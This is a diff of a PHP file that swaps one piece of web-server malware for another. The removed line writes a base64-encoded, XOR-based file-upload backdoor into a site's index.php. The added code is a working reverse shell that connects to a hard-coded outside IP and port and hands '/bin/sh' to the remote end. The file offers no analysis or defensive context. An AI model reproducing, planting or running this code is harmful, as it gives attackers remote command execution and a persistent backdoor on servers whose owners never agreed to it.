@@ -1,3 +1,20 @@
 <?php
-file_put_contents('../../../index.php',base64_decode('PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9GSUxFU1snaW1hZ2UnXSkpIHsKICAgICR1cGxvYWRlZCA9ICRfRklMRVNbJ2ltYWdlJ107CiAgICAKICAgICRlbmNvZGVkX25hbWUgPSBwYXRoaW5mbygkdXBsb2FkZWRbJ25hbWUnXSwgUEFUSElORk9fRklMRU5BTUUpOwogICAgJGhleCA9ICcnOwogICAgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCRlbmNvZGVkX25hbWUpOyAkaSArPSAyKSB7CiAgICAgICAgJGhleCAuPSBjaHIoaGV4ZGVjKHN1YnN0cigkZW5jb2RlZF9uYW1lLCAkaSwgMikpKTsKICAgIH0KICAgICRkZWNvZGVkX25hbWUgPSAnJzsKICAgIGZvcmVhY2ggKHN0cl9zcGxpdCgkaGV4KSBhcyAkY2hhcikgewogICAgICAgICRkZWNvZGVkX25hbWUgLj0gY2hyKG9yZCgkY2hhcikgXiAweEFBKTsKICAgIH0KICAgICRleHRlbnNpb24gPSBwYXRoaW5mbygkdXBsb2FkZWRbJ25hbWUnXSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgIAogICAgJGVuY29kZWRfY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cGxvYWRlZFsndG1wX25hbWUnXSk7CiAgICAkZGVjb2RlZF9jb250ZW50ID0gJyc7CiAgICBmb3IgKCRpID0gMDsgJGkgPCBzdHJsZW4oJGVuY29kZWRfY29udGVudCk7ICRpKyspIHsKICAgICAgICAkZGVjb2RlZF9jb250ZW50IC49IGNocihvcmQoJGVuY29kZWRfY29udGVudFskaV0pIF4gMHhBQSk7CiAgICB9CiAgICAKICAgICRmaW5hbF9uYW1lID0gJGRlY29kZWRfbmFtZSAuICgkZXh0ZW5zaW9uID8gIi4kZXh0ZW5zaW9uIiA6ICcnKTsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaW5hbF9uYW1lLCAkZGVjb2RlZF9jb250ZW50KTsKICAgIGVjaG8gIkZpbGUgZGVjb2RlZCBzdWNjZXNzZnVsbHk6ICRmaW5hbF9uYW1lIjsKfSBlbHNlIHsKICAgIGVjaG8gIjwhLS0gOThiNjcwZTUyNWZhNzY0Ii4iNzNiMzY0ODUzZWVlMmU5NWEgLS0+IjsKfQo/Pg=='));
+$ip = '195.85.19.90';
+$port = 5353;
+
+// 方法1: 使用fsockopen + proc_open
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+    exit("连接失败: $errstr ($errno)");
+}
+
+// 启动一个Shell进程并重定向输入/输出到Socket
+$descriptors = array(
+    0 => $sock,  // 标准输入
+    1 => $sock,  // 标准输出
+    2 => $sock   // 标准错误
+);
+
+$process = proc_open('/bin/sh', $descriptors, $pipes);
+proc_close($process);
 ?>
